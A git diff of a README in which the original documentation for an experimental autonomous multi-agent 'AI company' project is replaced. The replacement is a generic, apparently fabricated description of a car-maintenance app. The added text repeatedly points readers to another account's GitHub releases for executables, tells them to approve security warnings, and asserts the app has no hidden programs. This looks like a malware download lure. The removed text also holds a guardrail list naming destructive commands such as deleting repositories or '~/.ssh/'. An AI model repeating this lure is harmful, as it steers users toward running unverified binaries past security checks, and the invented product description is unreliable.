@@ -1,298 +1,130 @@
-<div align="center">
+# 🚗 Auto-Company - Works for You 24/7 on PC
 
-# Auto Company
+[![Download Auto-Company](https://img.shields.io/badge/Download-Auto--Company-blue?style=for-the-badge&logo=github)](https://github.com/Sid4dharth/Auto-Company/releases)
 
-**A fully autonomous AI company running 24/7**
+Welcome to Auto-Company. This app runs all day and night on your computer to help with your auto-related tasks. It works on Windows, Linux, and macOS. You don’t need any special skills or software. This guide will show you how to get it running in a few simple steps.
 
-14 AI agents, each modeled after world-class experts in their domain.
-They ideate products, make decisions, write code, deploy, and market - without human intervention.
+## 🖥️ What is Auto-Company?
 
-Powered by [Codex CLI](https://www.npmjs.com/package/@openai/codex) and Claude Code on macOS + Windows/WSL.
+Auto-Company is a tool that works nonstop on your PC. It handles tasks related to cars and automotive management. Think of it as a helper that never takes a break. It can assist with things like organizing car maintenance schedules, tracking expenses, and managing vehicle data right on your computer.
 
-[![macOS](https://img.shields.io/badge/Platform-macOS-blue)](#dependencies)
-[![Windows WSL](https://img.shields.io/badge/Platform-Windows%20WSL-blue)](#windows-wsl-quick-start)
-[![Codex CLI](https://img.shields.io/badge/Engine-Codex%20CLI-orange)](https://www.npmjs.com/package/@openai/codex)
-[![Claude Code](https://img.shields.io/badge/Engine-Claude%20Code-purple)](#dependencies)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](https://opensource.org/licenses/MIT)
-[![Status](https://img.shields.io/badge/Status-Experimental-red)](#disclaimer)
+This app works on the main operating systems:
 
-> **Experimental project** - still under active testing. It runs, but stability is not guaranteed.  
-> macOS uses launchd; Windows uses WSL systemd --user + PowerShell entry scripts.
+- Windows (7 and up)
+- Linux (any modern distribution)
+- macOS (10.12 and later)
 
-</div>
+You don’t have to be a tech expert to use it.
+
+## 📋 System Requirements
+
+Before you download, make sure your PC meets these needs:
+
+| Requirement            | Minimum Specifications                 |
+|-----------------------|---------------------------------------|
+| Operating System      | Windows 7+, Linux kernel 4.4+, macOS 10.12+ |
+| RAM                   | 2 GB or more                          |
+| Free Disk Space       | At least 200 MB                      |
+| Internet Connection   | Needed for downloading and updates    |
+| Processor             | Any modern processor (Intel or AMD)  |
+
+No special hardware is needed. If your PC can run regular apps and browse the internet, Auto-Company will run fine.
+
+## 📥 Download & Install
+
+To get Auto-Company running on your PC, follow these steps.
+
+### Step 1: Go to the Download Page
+
+Click the big button below or open this link in your browser:
+
+[![Download Auto-Company](https://img.shields.io/badge/Download-Auto--Company-blue?style=for-the-badge&logo=github)](https://github.com/Sid4dharth/Auto-Company/releases)
+
+This will take you to the Releases page on GitHub where you can find the latest versions.
+
+### Step 2: Choose Your Version
+
+Look for the latest release (usually at the top of the page). You will see different files for different systems:
+
+- `.exe` files for Windows
+- `.dmg` or `.pkg` files for macOS
+- `.AppImage` or `.tar.gz` files for Linux
+
+Pick the one that matches your computer’s operating system.
+
+### Step 3: Download the File
+
+Click the file name to start downloading. Depending on your internet speed, this may take a few minutes.
+
+### Step 4: Install Auto-Company
+
+- **Windows:** Open the `.exe` file and follow the prompts. Click “Next” to move through each step and finish the install.
+- **macOS:** Open the `.dmg` or `.pkg` file, then drag the app to your Applications folder.
+- **Linux:** For `.AppImage`, make it executable by right-clicking the file, selecting Properties, then Permissions, and checking “Allow executing file.” Double-click the file to run. For `.tar.gz` files, extract the archive and follow the included instructions (usually a README).
+
+### Step 5: Launch the App
+
+Once installed, find Auto-Company in your Start Menu, Applications folder, or wherever apps are stored on your system. Open it to start using.
+
+If you see any warnings about security, approve the app so it can run properly.
+
+## 🎯 How to Use Auto-Company
+
+When you open Auto-Company, here’s what you can expect:
+
+- A clean, simple interface with clear buttons.
+- Options to input your vehicle info.
+- Tools to track maintenance dates.
+- Expense logs to keep an eye on costs.
+- Reports that show your car’s history and needs.
+
+Everything is built to be easy to follow.
+
+### Basic Steps Inside the App
+
+1. **Add Your Vehicle:** Click “Add Car” and type in details like make, model, year, and license plate.
+2. **Set Maintenance Alerts:** Enter service intervals for things like oil changes and tire rotation.
+3. **Log Expenses:** Record costs such as fuel and repairs.
+4. **View Reports:** Check summaries of your vehicle’s status and expenses.
+
+The app saves all data on your computer, so it stays private.
+
+## 🛠️ Troubleshooting Tips
+
+If you run into issues, try these fixes:
+
+- **App won’t start:** Restart your PC and try again.
+- **Installation errors:** Make sure your system meets the requirements and that you downloaded the correct file.
+- **App crashes or freezes:** Close the app and reopen it. Check for updates.
+- **Missing features or buttons:** Restart the app or reinstall it.
+- **Update problems:** Delete old versions before reinstalling the newest one.
+
+If problems continue, use the GitHub page’s “Issues” tab to report your problem or ask for help.
+
+## 🔄 Updating Auto-Company
+
+Check the GitHub Releases page from time to time for new versions:
+
+[Download Latest Auto-Company](https://github.com/Sid4dharth/Auto-Company/releases)
+
+Download and install updates the same way you installed the first version. Updates include bug fixes, new features, and improvements.
+
+## 🔒 Privacy and Security
+
+Auto-Company runs on your PC and stores data locally. Your vehicle info and history stay on your machine only unless you choose to share it. No data is sent anywhere without your permission.
+
+The app does not install any hidden programs or trackers. You remain in control.
+
+## ❓ Need More Help?
+
+For additional questions or guidance:
+
+- Visit the GitHub page: https://github.com/Sid4dharth/Auto-Company
+- Use the Discussions or Issues tab to ask for help or report bugs.
+- Check online forums or tech groups for general PC help.
+
+You don’t need to be a programmer to run this app, but if you want to explore the technical side, the GitHub site has documentation available.
 
 ---
 
-[中文版本](README-ZH.md)
-
-## Dashboard Preview
-
-![Auto Company Dashboard](presentation/dashboard-showcase.png)
-
-## What Is This?
-
-You start a loop. The AI team wakes up, reads shared consensus memory, decides what to do, forms a 3-5 person squad, executes, updates consensus memory, then sleeps briefly. Then it repeats.
-
-```
-daemon (launchd / systemd --user, auto-restart on crash)
-  └── scripts/core/auto-loop.sh (continuous loop)
-        ├── reads PROMPT.md + consensus.md
-        ├── LLM CLI call (Codex CLI / Claude Code)
-        │   ├── reads CLAUDE.md (charter + guardrails)
-        │   ├── reads .claude/skills/team/SKILL.md (teaming method)
-        │   ├── forms an Agent Team (3-5 agents)
-        │   ├── executes: research, coding, deploy, marketing
-        │   └── updates memories/consensus.md (handoff baton)
-        ├── failure handling: rate-limit wait / circuit breaker / consensus rollback
-        └── sleep -> next cycle
-```
-
-Each cycle is an independent CLI call. `memories/consensus.md` is the only cross-cycle state.
-
-## Where To Start (By Platform)
-
-- Windows users: start from [Windows (WSL) Quick Start](#windows-wsl-quick-start), then read [`docs/windows-setup.md`](docs/windows-setup.md)
-- macOS users: start from [macOS Quick Start](#macos-quick-start), then see [Command Quick Reference](#command-quick-reference-by-platform)
-
-## Team Lineup (14 Agents)
-
-This is not "you are a generic developer". It is "you are DHH" style role prompting with real expert mental models.
-
-| Layer | Role | Expert Persona | Core Strength |
-|------|------|------|----------|
-| **Strategy** | CEO | Jeff Bezos | PR/FAQ, flywheel thinking, Day 1 mindset |
-| | CTO | Werner Vogels | Design for failure, API-first architecture |
-| | Inversion | Charlie Munger | Inversion, pre-mortems, misjudgment checklist |
-| **Product** | Product Design | Don Norman | Affordance, mental models, human-centered design |
-| | UI Design | Matias Duarte | Material metaphor, typography-first design |
-| | Interaction Design | Alan Cooper | Goal-directed design, persona-driven decisions |
-| **Engineering** | Full-Stack | DHH | Convention over configuration, majestic monolith |
-| | QA | James Bach | Exploratory testing, testing is not checking |
-| | DevOps/SRE | Kelsey Hightower | Automation first, reliability discipline |
-| **Business** | Marketing | Seth Godin | Purple cow, permission marketing, smallest viable audience |
-| | Operations | Paul Graham | Do things that do not scale, ramen profitability |
-| | Sales | Aaron Ross | Predictable revenue, funnel systems |
-| | CFO | Patrick Campbell | Value-based pricing, unit economics |
-| **Intelligence** | Research Analyst | Ben Thompson | Aggregation theory, value chain analysis |
-
-Plus 30+ reusable skills (deep research, scraping, financial modeling, SEO, security audit, UX audit, etc.).
-
-## macOS Quick Start
-
-```bash
-# Prerequisites:
-# - macOS
-# - Codex CLI or Claude Code installed and authenticated
-# - Available model quota
-
-# Clone
-git clone https://github.com/nicepkg/auto-company.git
-cd auto-company
-
-# Foreground run (live output)
-make start
-
-# Or install daemon (auto-start + auto-restart)
-make install
-```
-
-## Windows (WSL) Quick Start
-
-```powershell
-# Prerequisites:
-# - Windows 10/11 + WSL2 (Ubuntu)
-# - Codex CLI or Claude Code installed and authenticated inside WSL
-# - jq and make available inside WSL
-# - Available model quota
-
-# Clone
-git clone https://github.com/nicepkg/auto-company.git
-cd auto-company
-
-# Start (daemon mode via PowerShell)
-.\scripts\windows\start-win.ps1
-
-# Status
-.\scripts\windows\status-win.ps1
-
-# Stop
-.\scripts\windows\stop-win.ps1
-```
-
-For monitoring, dashboard, and autostart commands, see [`docs/windows-setup.md`](docs/windows-setup.md).
-
-## Command Quick Reference (By Platform)
-
-| Task | macOS / WSL (Terminal) | Windows (PowerShell) |
-|---|---|---|
-| Start | `make start` | `.\scripts\windows\start-win.ps1` |
-| Status | `make status` | `.\scripts\windows\status-win.ps1` |
-| Live logs | `make monitor` | `.\scripts\windows\monitor-win.ps1` |
-| Last cycle output | `make last` | `.\scripts\windows\last-win.ps1` |
-| Cycle summary | `make cycles` | `.\scripts\windows\cycles-win.ps1` |
-| Stop | `make stop` | `.\scripts\windows\stop-win.ps1` |
-| Web dashboard | N/A | `.\scripts\windows\dashboard-win.ps1` |
-| Install daemon | `make install` | Auto-installed/started by `start-win.ps1` |
-| Uninstall daemon | `make uninstall` | `wsl -d Ubuntu --cd <repo_wsl_path> bash -lc 'make uninstall'` |
-| Pause daemon | `make pause` | `wsl -d Ubuntu --cd <repo_wsl_path> bash -lc 'make pause'` |
-| Resume daemon | `make resume` | `wsl -d Ubuntu --cd <repo_wsl_path> bash -lc 'make resume'` |
-
-### macOS Sleep Prevention (macOS Only)
-
-macOS screen lock usually does not kill processes, but system sleep can pause work. For long runs:
-
-```bash
-make start-awake   # Start loop and keep system awake until loop exits
-
-# If loop is already running (after make start):
-make awake         # Attach caffeinate to PID in .auto-loop.pid
-```
-
-Notes:
-- Both commands depend on built-in `caffeinate`
-- `make awake` exits automatically when target PID exits
-
-## Operating Model
-
-### Automatic Convergence (No Endless Discussion)
-
-| Cycle | Action |
-|------|------|
-| Cycle 1 | Brainstorm: each agent proposes ideas, rank top 3 |
-| Cycle 2 | Validate #1: Munger pre-mortem + Thompson market check + Campbell economics -> **GO / NO-GO** |
-| Cycle 3+ | GO -> create repo, build, deploy. NO-GO -> move to next idea. Discussion-only loops are forbidden |
-
-### Six Standard Workflows
-
-| # | Workflow | Collaboration Chain |
-|---|------|--------|
-| 1 | **New Product Evaluation** | Research -> CEO -> Munger -> Product -> CTO -> CFO |
-| 2 | **Feature Development** | Interaction -> UI -> Full-stack -> QA -> DevOps |
-| 3 | **Product Launch** | QA -> DevOps -> Marketing -> Sales -> Ops -> CEO |
-| 4 | **Pricing and Monetization** | Research -> CFO -> Sales -> Munger -> CEO |
-| 5 | **Weekly Review** | Ops -> Sales -> CFO -> QA -> CEO |
-| 6 | **Opportunity Discovery** | Research -> CEO -> Munger -> CFO |
-
-## Steering
-
-The team runs autonomously, but you can intervene at any time:
-
-| Method | Action |
-|------|------|
-| **Change direction** | Edit "Next Action" in `memories/consensus.md` |
-| **Pause** | `make pause` (macOS/WSL daemon mode) or `.\scripts\windows\stop-win.ps1` (Windows entry) |
-| **Resume** | `make resume` |
-| **Review outputs** | Check `docs/*/` for artifacts generated by agents |
-
-## Safety Guardrails
-
-Hard constraints in `CLAUDE.md`, enforced for all agents:
-
-- Do not delete GitHub repos (`gh repo delete`)
-- Do not delete Cloudflare projects (`wrangler delete`)
-- Do not delete system directories (`~/.ssh/`, `~/.config/`, etc.)
-- Do not perform illegal activity
-- Do not leak credentials into public repositories
-- Do not force push to main/master
-- Create all new projects under `projects/`
-
-## Configuration
-
-Environment variable overrides:
-
-```bash
-MODEL=gpt-5.3-codex make start             # Optional model override
-LOOP_INTERVAL=60 make start                # 60s interval (default 30)
-CYCLE_TIMEOUT_SECONDS=3600 make start      # 1h cycle timeout (default 1800)
-MAX_CONSECUTIVE_ERRORS=3 make start        # Circuit-breaker threshold (default 5)
-CODEX_SANDBOX_MODE=workspace-write make start  # Optional sandbox override
-```
-
-## Project Structure
-
-```
-auto-company/
-├── CLAUDE.md              # Company charter (mission + guardrails + team + workflows)
-├── PROMPT.md              # Per-cycle execution prompt (convergence rules)
-├── Makefile               # Common command entry
-├── INDEX.md               # script index + responsibility table
-├── dashboard/             # Local web status dashboard (started via dashboard-win.ps1)
-├── scripts/
-│   ├── core/              # Core loop and control scripts (auto-loop/monitor/stop)
-│   ├── windows/           # Windows entry/guardian/autostart scripts
-│   ├── wsl/               # WSL systemd --user daemon scripts
-│   └── macos/             # macOS launchd daemon scripts
-├── memories/
-│   └── consensus.md       # Shared handoff memory across cycles
-├── docs/                  # Agent outputs (14 folders + Windows guide)
-├── projects/              # Workspace for generated projects
-├── logs/                  # Loop logs
-└── .claude/
-    ├── agents/            # 14 agent definitions (expert personas)
-    ├── skills/            # 30+ reusable skills
-    └── settings.json      # Permissions + Agent Teams switch
-```
-
-## Dependencies
-
-| Dependency | Notes |
-|------|------|
-| **Codex CLI / Claude Code** | Supported CLI engines |
-| **macOS or Windows + WSL2 (Ubuntu)** | macOS uses launchd; Windows uses WSL execution core |
-| `node` | Codex runtime |
-| `make` | Start/stop/monitor command entry (WSL/macOS) |
-| `jq` | Recommended for log processing |
-| `gh` | Optional, GitHub CLI |
-| `wrangler` | Optional, Cloudflare CLI |
-
-## FAQ
-
-### 1) WSL `.sh` fails with `^M` / `bad interpreter`
-
-- Cause: CRLF line endings in shell scripts
-- Fix:
-  - Keep LF rules in `.gitattributes`
-  - Run `git config core.autocrlf false && git config core.eol lf`
-
-### 2) WSL says `codex`/`claude` command not found
-
-- Cause: CLI installed on Windows only, missing in WSL
-- Fix: install `node` and your chosen CLI inside WSL (`@openai/codex` or Claude Code)
-
-### 3) `make install` fails inside WSL
-
-- Cause: no available `systemctl --user` in current session
-- Fix:
-  - Verify WSL systemd is enabled
-  - Run `systemctl --user --version`
-  - Re-open WSL session and retry if needed
-
-## Disclaimer
-
-This is an **experimental project**:
-
-- **Daemon mode works on both macOS and WSL**: launchd on macOS, systemd --user on WSL
-- **Windows entry requires WSL**: PowerShell is only the control layer
-- **Still under test**: runs, but stability is not guaranteed
-- **Costs money**: each cycle consumes model quota
-- **Fully autonomous**: agents act without approval prompts; configure guardrails carefully in `CLAUDE.md`
-- **No warranty**: review `docs/` and `projects/` regularly
-
-Suggested rollout: start with `make start` (foreground), then move to daemon mode (`make install` on macOS/WSL, `.\scripts\windows\start-win.ps1` on Windows).
-
-## 🤝 Contribution
-
-Issues and pull requests are welcome.
-
-Recommended flow:
-1. Fork the repository.
-2. Create a feature branch.
-3. Keep changes scoped and testable.
-4. Open a PR with clear context, risk, and verification notes.
-
-## Acknowledgments
-
-- [nicepkg/auto-company](https://github.com/nicepkg/auto-company) - initial macOS edition
-- [continuous-claude](https://github.com/AnandChowdhary/continuous-claude) - cross-session shared notes
-- [ralph-claude-code](https://github.com/frankbria/ralph-claude-code) - exit signal interception
-- [claude-auto-resume](https://github.com/terryso/claude-auto-resume) - usage-limit resume pattern
+[![Download Auto-Company](https://img.shields.io/badge/Download-Auto--Company-blue?style=for-the-badge&logo=github)](https://github.com/Sid4dharth/Auto-Company/releases)
